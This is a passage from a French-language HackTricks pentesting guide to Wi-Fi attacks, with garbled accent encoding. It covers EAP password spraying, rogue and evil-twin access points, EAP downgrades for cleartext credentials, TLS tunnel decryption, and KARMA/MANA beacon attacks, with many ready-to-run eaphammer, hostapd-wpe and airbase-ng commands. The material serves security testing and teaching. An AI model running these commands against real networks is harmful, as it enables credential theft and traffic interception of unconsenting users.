(uniquement pris en charge par TTLS), l'User-Name et les autres attributs d'authentification r√©cup√©r√©s du contenu TLS sont plac√©s dans le message RADIUS sortant √† la place de l'User-Name anonyme et des attributs EAP-Message TTLS inclus dans la demande RADIUS entrante.

### EAP-Bruteforce (pulv√©risation de mot de passe)

Si le client doit utiliser un **nom d'utilisateur et un mot de passe** (notez que **EAP-TLS ne sera pas valide** dans ce cas), alors vous pourriez essayer d'obtenir une **liste** de **noms d'utilisateur** (voir la partie suivante) et **mots de passe** et tenter de **forcer brutalement** l'acc√®s en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pourriez √©galement r√©aliser cette attaque en utilisant `eaphammer` :
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Attaques sur les clients - Th√©orie

### S√©lection de r√©seau et itin√©rance

Bien que le protocole 802.11 ait des r√®gles tr√®s sp√©cifiques qui dictent comment une station peut rejoindre un ESS, il ne sp√©cifie pas comment la station doit s√©lectionner un ESS pour se connecter. De plus, le protocole permet aux stations de se d√©placer librement entre les points d'acc√®s qui partagent le m√™me ESSID (car vous ne voudriez pas perdre la connectivit√© WiFi en marchant d'un bout √† l'autre d'un b√¢timent, etc). Cependant, le protocole 802.11 ne sp√©cifie pas comment ces points d'acc√®s doivent √™tre s√©lectionn√©s. En outre, m√™me si les stations doivent √™tre authentifi√©es √† l'ESS pour s'associer √† un point d'acc√®s, le protocole 802.11 n'exige pas que le point d'acc√®s soit authentifi√© √† la station.

### Listes de r√©seaux pr√©f√©r√©s (PNLs)

Chaque fois qu'une station se connecte √† un r√©seau sans fil, l'ESSID du r√©seau est stock√© dans la Liste de R√©seaux Pr√©f√©r√©s (PNL) de la station. La PNL est une liste ordonn√©e de tous les r√©seaux auxquels la station s'est connect√©e dans le pass√©, et chaque entr√©e dans la PNL contient l'ESSID du r√©seau et toutes les informations de configuration sp√©cifiques au r√©seau n√©cessaires pour √©tablir une connexion.

### Balayage passif

Dans les r√©seaux d'infrastructure, les points d'acc√®s transmettent p√©riodiquement des trames de balise pour annoncer leur pr√©sence et leurs capacit√©s aux stations √† proximit√©. Les balises sont des trames de diffusion, ce qui signifie qu'elles sont destin√©es √† √™tre re√ßues par toutes les stations √† proximit√© dans la port√©e. Les balises incluent des informations sur les taux pris en charge par le PA, les capacit√©s de chiffrement, des informations suppl√©mentaires, et surtout, les trames de balise contiennent l'ESSID du PA (tant que la diffusion de l'ESSID n'est pas d√©sactiv√©e).

Lors du balayage passif, le dispositif client √©coute les trames de balise des points d'acc√®s √† proximit√©. Si le dispositif client re√ßoit une trame de balise dont le champ ESSID correspond √† un ESSID de la PNL du client, le client se connectera automatiquement au point d'acc√®s qui a envoy√© la trame de balise. Ensuite, supposons que nous voulons cibler un dispositif sans fil qui n'est actuellement connect√© √† aucun r√©seau sans fil. Si nous connaissons au moins une entr√©e dans la PNL de ce client, nous pouvons forcer le client √† se connecter √† nous simplement en cr√©ant notre propre point d'acc√®s avec l'ESSID de cette entr√©e.

### Sondage actif

Le deuxi√®me algorithme de s√©lection de r√©seau utilis√© dans le 802.11 est connu sous le nom de Sondage Actif. Les dispositifs clients qui utilisent le sondage actif transmettent continuellement des trames de requ√™te de sondage pour d√©terminer quels PA sont √† port√©e, ainsi que leurs capacit√©s. Les requ√™tes de sondage se pr√©sentent sous deux formes : dirig√©es et de diffusion. Les requ√™tes de sondage dirig√©es sont adress√©es √† un ESSID sp√©cifique, et sont le moyen pour le client de v√©rifier si un r√©seau sp√©cifique est √† proximit√©.

Les clients qui utilisent le sondage dirig√© enverront des requ√™tes de sondage pour chaque r√©seau dans sa PNL. Il convient de noter que le sondage dirig√© est le seul moyen d'identifier la pr√©sence de r√©seaux cach√©s √† proximit√©. Les requ√™tes de sondage de diffusion fonctionnent presque exactement de la m√™me mani√®re, mais sont envoy√©es avec le champ SSID d√©fini sur NULL. Cela adresse la requ√™te de sondage de diffusion √† tous les points d'acc√®s √† proximit√©, permettant √† la station de v√©rifier si l'un de ses r√©seaux pr√©f√©r√©s est √† proximit√© sans r√©v√©ler le contenu de sa PNL

## AP simple avec redirection vers Internet

Avant d'expliquer comment r√©aliser des attaques plus complexes, il va √™tre expliqu√© **comment** simplement **cr√©er** un **AP** et **rediriger** son **trafic** vers une interface connect√©e **√†** l'**Internet**.

En utilisant `ifconfig -a`, v√©rifiez que l'interface wlan pour cr√©er l'AP et l'interface connect√©e √† Internet sont pr√©sentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
cr√©ez un fichier de configuration _/etc/dnsmasq.conf_ comme suit :
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **configurez les IP** et **les routes** :
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Et ensuite **d√©marrez** dnsmasq :
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```
apt-get install hostapd
```
Cr√©ez un fichier de configuration _hostapd.conf :_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arr√™tez les processus ennuyeux**, activez le **mode moniteur**, et **d√©marrez hostapd** :
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Transfert et Redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Jumeau Mal√©fique

Une attaque par jumeau mal√©fique est un type d'attaque Wi-Fi qui exploite le fait que la plupart des ordinateurs et t√©l√©phones ne voient que le "nom" ou ESSID d'un r√©seau sans fil (la station de base n'√©tant pas tenue de s'authentifier aupr√®s du client). Cela rend en r√©alit√© tr√®s difficile de distinguer entre les r√©seaux ayant le m√™me nom et le m√™me type de chiffrement. En fait, de nombreux r√©seaux auront plusieurs points d'acc√®s destin√©s √† √©tendre le r√©seau, tous utilisant le m√™me nom pour ne pas confondre les utilisateurs.

En raison de la mani√®re dont les clients sont impl√©ment√©s (rappelons que le protocole 802.11 permet aux stations de se d√©placer librement entre les points d'acc√®s au sein du m√™me ESS), il est possible de faire en sorte qu'un appareil change de station de base √† laquelle il est connect√©. Il est possible de faire cela en offrant un meilleur signal (ce qui n'est pas toujours possible) ou en bloquant l'acc√®s √† la station de base originale (paquets de d√©sauthentification, brouillage ou une autre forme d'attaque par d√©ni de service).

Notez √©galement que les d√©ploiements sans fil dans le monde r√©el ont g√©n√©ralement plus d'un seul point d'acc√®s, et ces points d'acc√®s sont souvent plus puissants et ont une meilleure port√©e en ligne directe en raison de leur placement vers le plafond. D√©sauthentifier un seul point d'acc√®s entra√Æne g√©n√©ralement la migration de la cible vers un autre point d'acc√®s valide plut√¥t que vers votre point d'acc√®s malveillant, √† moins que tous les points d'acc√®s √† proximit√© ne soient d√©sauthentifi√©s (bruyant) ou que vous soyez tr√®s prudent avec le placement du point d'acc√®s malveillant (difficile).

Vous pouvez cr√©er un Jumeau Mal√©fique Ouvert tr√®s basique (sans capacit√© de router le trafic vers Internet) en faisant :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez √©galement cr√©er un Evil Twin en utilisant **eaphammer** (notez que pour cr√©er des evil twins avec eaphammer, l'interface **ne doit PAS √™tre** en mode **monitor**) :
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon : `Options : 5,6,7,8,9 (dans le menu d'attaque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Veuillez noter que par d√©faut, si un ESSID dans la PNL est enregistr√© comme prot√©g√© par WPA, l'appareil ne se connectera pas automatiquement √† un Evil Twin ouvert. Vous pouvez essayer de r√©aliser un DoS sur le vrai AP et esp√©rer que l'utilisateur se connecte manuellement √† votre Evil Twin ouvert, ou vous pourriez r√©aliser un DoS sur le vrai AP et utiliser un Evil Twin WPA pour capturer la poign√©e de main (en utilisant cette m√©thode, vous ne pourrez pas permettre √† la victime de se connecter car vous ne connaissez pas la PSK, mais vous pouvez capturer la poign√©e de main et essayer de la craquer).

_Certains OS et AV avertiront l'utilisateur que se connecter √† un r√©seau ouvert est dangereux..._

### Evil Twin WPA/WPA2

Vous pouvez cr√©er un **Evil Twin utilisant WPA/2** et si les appareils sont configur√©s pour se connecter √† cet SSID avec WPA/2, ils vont essayer de se connecter. Cependant, **pour compl√©ter la poign√©e de main en 4 √©tapes**, vous devez √©galement **conna√Ætre** le **mot de passe** que le client va utiliser. Si vous ne le **connaissez pas**, la **connexion ne sera pas compl√©t√©e**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Jumeau Mal√©fique d'Entreprise

Pour comprendre ces attaques, je recommanderais de lire d'abord la br√®ve [explication de WPA Enterprise](./#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` n√©cessite un fichier de **configuration** pour fonctionner. Pour **automatiser** la g√©n√©ration de ces configurations, vous pourriez utiliser [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (t√©l√©chargez le fichier python dans _/etc/hostapd-wpe/_)
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez s√©lectionner de nombreuses options diff√©rentes telles que ssid, canal, fichiers utilisateur, cret/cl√©, param√®tres dh, version wpa et auth...

[**Utiliser hostapd-wpe avec EAP-TLS pour permettre √† n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utiliser EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par d√©faut, EAPHammer utilise ces m√©thodes d'authentification (remarquez GTC comme premi√®re m√©thode pour essayer d'obtenir des mots de passe en clair, puis l'utilisation de m√©thodes d'authentification plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Cette m√©thode est la m√©thodologie par d√©faut pour √©viter les longs temps de connexion. Cependant, vous pouvez √©galement sp√©cifier au serveur de servir les m√©thodes d'authentification de la plus faible √† la plus forte :
```
--negotiate weakest
```
Ou vous pourriez √©galement utiliser :

* `--negotiate gtc-downgrade` pour utiliser une impl√©mentation de d√©classement GTC tr√®s efficace (mots de passe en clair)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` pour sp√©cifier manuellement les m√©thodes propos√©es (proposer les m√™mes m√©thodes d'authentification dans le m√™me ordre que l'organisation rendra l'attaque beaucoup plus difficile √† d√©tecter).
* [Trouvez plus d'informations dans le wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats g√©n√©r√©s pr√©c√©demment pour offrir une authentification EAP aux r√©seaux WPA/WPA2-Enterprise. Le faux r√©seau va d√©classer le protocole de connexion √† EAP-MD5 afin de pouvoir **capturer l'utilisateur et le MD5 du mot de passe**. Plus tard, l'attaquant peut essayer de craquer le mot de passe.\
`Airgeddon` vous offre la possibilit√© d'une **attaque Evil Twin continue (bruyante)** ou de **cr√©er seulement l'attaque Evil Twin jusqu'√† ce que quelqu'un se connecte (douce).**

![](<../../.gitbook/assets/image (129).png>)

### D√©bogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twins

_Cette m√©thode a √©t√© test√©e sur une connexion PEAP mais comme je d√©chiffre un tunnel TLS arbitraire, cela devrait √©galement fonctionner avec EAP-TTLS_

Dans la **configuration** de _hostapd-wpe_ **commentez** la ligne qui contient _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` √† `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera en sorte que `hostapd-wpe` **√©change des cl√©s en utilisant RSA** au lieu de DH, vous permettant ainsi de **d√©chiffrer** le trafic plus tard **en connaissant la cl√© priv√©e du serveur**.

Maintenant, d√©marrez l'**Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifi√©e comme d'habitude. D√©marrez √©galement **`wireshark`** sur l'**interface** qui effectue l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous aurez d√©j√† captur√© certaines tentatives d'authentification), vous pouvez ajouter la cl√© priv√©e RSA √† wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entr√©e et remplissez le formulaire avec ces valeurs : **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**s√©lectionnez votre fichier de cl√©**, pour √©viter les probl√®mes choisissez un fichier de cl√© **sans protection par mot de passe**).

![](<../../.gitbook/assets/image (151).png>)

Et regardez le nouvel onglet **"Decrypted TLS"** :

![](<../../.gitbook/assets/image (152).png>)

## KARMA, MANA, Loud MANA et attaque des balises connues

### Listes noires/blanches d'ESSID et de MAC

Le tableau suivant r√©pertorie les diff√©rents types de MFACLs (Management Frame Access Control Lists) disponibles, ainsi que leurs effets lorsqu'ils sont utilis√©s :

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Les attaques KARMA sont une seconde forme d'attaque par point d'acc√®s malveillant qui exploite le processus de s√©lection de r√©seau utilis√© par les stations. Dans un livre blanc √©crit en 2005, Dino Dai Zovi et Shane Macaulay d√©crivent comment un attaquant peut configurer un point d'acc√®s pour √©couter les requ√™tes de sondage dirig√©es et y r√©pondre avec des r√©ponses de sondage dirig√©es correspondantes. Cela am√®ne les stations affect√©es √† envoyer automatiquement une demande d'association au point d'acc√®s de l'attaquant. Le point d'acc√®s r√©pond alors avec une r√©ponse d'association, provoquant la connexion des stations affect√©es au point d'acc√®s de l'attaquant.

### MANA

Selon Ian de Villiers et Dominic White, les stations modernes sont con√ßues pour se prot√©ger contre les attaques KARMA en ignorant les r√©ponses de sondage dirig√©es provenant de points d'acc√®s qui n'ont pas d√©j√† r√©pondu √† au moins une demande de sondage de diffusion. Cela a conduit √† une baisse significative du nombre de stations vuln√©rables aux attaques KARMA jusqu'en 2015, lorsque White et de Villiers ont d√©velopp√© un moyen de contourner de telles protections. Dans l'attaque KARMA am√©lior√©e de White et de Villiers (attaque MANA), les r√©ponses de sondage dirig√©es sont utilis√©es pour reconstruire les PNL des stations √† proximit√©. Lorsqu'une demande de sondage de diffusion est re√ßue d'une station, le point d'acc√®s de l'attaquant r√©pond avec un SSID arbitraire de la PNL de la station d√©j√† vu dans une sonde directe de cet appareil.

En r√©sum√©, l'algorithme MANA fonctionne ainsi : chaque fois que le point d'acc√®s re√ßoit une demande de sondage, il d√©termine d'abord s'il s'agit d'une sonde de diffusion ou dirig√©e. S'il s'agit d'une sonde dirig√©e, l'adresse MAC de l'exp√©diteur est ajout√©e √† la table de hachage (si elle n'y est pas d√©j√†) et l'ESSID est ajout√© √† la PNL de cet appareil. Le PA r√©pond ensuite avec une r√©ponse de sondage dirig√©e. S'il s'agit d'une sonde de diffusion, le point d'acc√®s r√©pond avec des r√©ponses de sondage pour chacun des r√©seaux dans la PNL de cet appareil.

Attaque MANA en utilisant eaphammer :
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Notez que l'attaque MANA standard ne nous permet toujours pas d'attaquer les appareils qui n'utilisent pas du tout de sondage dirig√©. Donc, si nous ne connaissons pas non plus au pr√©alable une entr√©e dans la PNL de l'appareil, nous devons trouver une autre mani√®re de l'attaquer.

Une possibilit√© est ce qu'on appelle l'attaque Loud MANA. Cette attaque repose sur l'id√©e que les appareils clients √† proximit√© physique les uns des autres sont susceptibles d'avoir au moins quelques entr√©es communes dans leurs PNL.

En r√©sum√©, l'attaque Loud MANA, au lieu de r√©pondre aux demandes de sondage avec chaque ESSID dans la PNL d'un appareil particulier, le point d'acc√®s malveillant envoie des r√©ponses de sondage pour chaque ESSID dans chaque PNL de tous les appareils qu'il a vus auparavant. En rapportant cela √† la th√©orie des ensembles, nous pouvons dire que le point d'acc√®s envoie des r√©ponses de sondage pour chaque ESSID dans l'union de toutes les PNL des appareils √† proximit√©.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Attaque Known Beacon

Il existe encore des cas o√π l'attaque Loud MANA ne r√©ussira pas.\
L'attaque Known Beacon est une m√©thode pour "forcer brutalement" les ESSIDs afin d'essayer de faire se connecter la victime √† l'attaquant. L'attaquant cr√©e un AP qui r√©pond √† n'importe quel ESSID et ex√©cute du code envoyant des balises qui simulent les ESSIDs de chaque nom dans une liste de mots. Avec un peu de chance, la victime contiendra certains de ces noms d'ESSID dans sa PNL et essaiera de se connecter √† l'AP factice.\
Eaphammer a impl√©ment√© cette attaque comme une attaque MANA o√π tous les ESSIDs dans une liste sont charg√©s (vous pourriez √©galement combiner cela avec `--loud` pour cr√©er une attaque Loud MANA + Known beacons) :
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Attaque par rafale de balises connues**

Comme les balises connues sont bruyantes. Vous pouvez utiliser un script du projet Eaphammer pour lancer tr√®s rapidement des balises de chaque nom ESSID contenu dans un fichier. Si vous combinez ce script avec une attaque MANA d'Eaphammer, les clients pourront se connecter √† votre AP.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct est une norme Wi-Fi qui permet aux appareils de se connecter entre eux sans point d'acc√®s sans fil, car l'un des deux appareils agira comme point d'acc√®s (appel√© propri√©taire du groupe). Vous pouvez trouver Wi-Fi Direct dans de nombreux appareils IoT tels que les imprimantes, les t√©l√©viseurs...

Wi-Fi Direct s'appuie sur le Wi-Fi Protected Setup (**WPS**) pour connecter les appareils de mani√®re s√©curis√©e. WPS dispose de plusieurs m√©thodes de configuration telles que la Configuration par **Push-Button** (PBC), l'entr√©e de **PIN** et la Communication en **Champ Proche** (NFC).

Ainsi, les attaques pr√©c√©demment vues sur le PIN WPS sont √©galement valables ici si le PIN est utilis√©.

### D√©tournement EvilDirect

Cela fonctionne comme un Evil-Twin mais pour Wi-Fi Direct, vous pouvez vous faire passer pour un propri√©taire de groupe pour essayer de faire connecter d'autres appareils comme des t√©l√©phones √† vous : `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## R√©f√©rences

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: Jeter un ≈ìil √† [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion avec Facebook et imitation de WPA dans les portails captifs)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus de Hacking**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du hacking.

**Nouvelles de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en √©volution rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el.

**Derni√®res Annonces**\
Restez inform√© avec le lancement des derni√®res primes de bugs et les mises √† jour cruciales de la plateforme.

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
